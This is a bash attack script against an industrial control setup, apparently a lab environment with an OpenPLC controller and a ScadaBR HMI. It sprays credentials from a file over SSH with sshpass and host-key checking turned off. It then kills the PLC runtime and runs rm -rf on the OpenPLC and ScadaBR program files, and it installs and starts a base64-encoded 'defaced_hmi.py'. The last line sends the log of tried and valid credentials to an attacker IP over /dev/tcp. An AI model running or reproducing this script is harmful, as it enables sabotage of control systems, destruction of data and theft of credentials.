#!/bin/bash

## Stop OpenPLC and Remove all programs

# Configuration
ATK_IP="172.16.10.3"
ATK_PORT="4242"
PLC_IP="10.0.0.3" 
HMI_IP="10.0.0.4"
USER_PASS_FILE="/home/SCADA.conf"
REMOTE_DB_PATH="/opt/OpenPLC_v3/webserver/openplc.db"
LOG_FILE="/home/attack_debug.log"
DEFACE_DOWNLOAD_PORT="4343"
DEFACE_FILE="defaced_hmi.py"
JUMPBOX_IP="10.10.6.3"
B64_SCRIPT=$(base64 -w -0 defaced_hmi.py)


# Initialize the log file
echo "--- Background Attack Started: $(date) ---" >> "$LOG_FILE"

if [[ ! -f "$USER_PASS_FILE" ]]; then
    echo "Error: $USER_PASS_FILE not found." >> "$LOG_FILE"
    exit 1
fi
# Start a listening socket for PLC to grab file from
# cat $DEFACE_FILE | nc -l -q 10 -p $DEFACE_DOWNLOAD_PORT &

while IFS=':' read -r USERNAME PASSWORD; do
    # Log the attempt locally
    echo "[$(date)] Attempting: $USERNAME:$PASSWORD" >> "$LOG_FILE"
    
    # Run SSH in the background logic
    # Direct redirection of both stdout and stderr (2>&1) into the log file
    sshpass -p "$PASSWORD" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$USERNAME@$PLC_IP" << EOF >> "$LOG_FILE" 2>&1
        echo "Successfully authenticated as: $USERNAME"
        echo "Stopping OpenPLC Process..."
        PID=\$(ps -aux | grep -i "[p]sm\|[o]penplc" | awk '{print \$2}')
        echo \$PID
        kill -9 \$PID
        echo "Removing OpenPLC Runtime Files..."
        rm -rf /opt/OpenPLC_v3/*
        echo "Starting New Webserver..."
        echo "$B64_SCRIPT" | base64 -d > /opt/OpenPLC_v3/defaced_hmi.py
        python3 /opt/OpenPLC_v3/defaced_hmi.py > /dev/null 2>&1 &
        exit 0
EOF

    # Capture the exit status of the SSH command (first command in the pipe/redirection block)
    # Even without a pipe, using $? here works to check the SSH session result
    if [ $? -eq 0 ]; then
        echo "[$(date)] SUCCESS: Valid credentials found ($USERNAME). Commands executed." >> "$LOG_FILE"
        break
    fi

done < "$USER_PASS_FILE"

## Deface HMI
echo "--- Defacing HMI Started: $(date) ---" >> "$LOG_FILE"
# Start a listening socket for HMI to grab file from
# nc -l -p $DEFACE_DOWNLOAD_PORT < $DEFACE_FILE &
cat $DEFACE_FILE | nc -l -q 10 -p $DEFACE_DOWNLOAD_PORT &

while IFS=':' read -r USERNAME PASSWORD; do
    # Log the attempt locally
    echo "[$(date)] Attempting: $USERNAME:$PASSWORD" >> "$LOG_FILE"
    
    # Run SSH in the background logic
    # Direct redirection of both stdout and stderr (2>&1) into the log file
    sshpass -p "$PASSWORD" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$USERNAME@$HMI_IP" << EOF >> "$LOG_FILE" 2>&1
        echo "Successfully authenticated as: $USERNAME"
        cd /ScadaBR_Installer
        pwd
        echo "Step 1: Stopping ScadaBR..."
        ./scadabr.sh stop
        
        echo "Step 2: Removing program files..."
        rm -rf *
        rm -rf /opt/ScadaBR/*
        
        echo "Step 3: Starting Server..."
        echo "$B64_SCRIPT" | base64 -d > /ScadaBR_Installer/defaced_hmi.py
        python3 /ScadaBR_Installer/defaced_hmi.py > /dev/null 2>&1 &
        exit 0
EOF

    # Capture the exit status of the SSH command (first command in the pipe/redirection block)
    # Even without a pipe, using $? here works to check the SSH session result
    if [ $? -eq 0 ]; then
        echo "[$(date)] SUCCESS: Valid credentials found ($USERNAME). Commands executed." >> "$LOG_FILE"
        break
    fi

done < "$USER_PASS_FILE"

cat $LOG_FILE > /dev/tcp/$ATK_IP/$ATK_PORT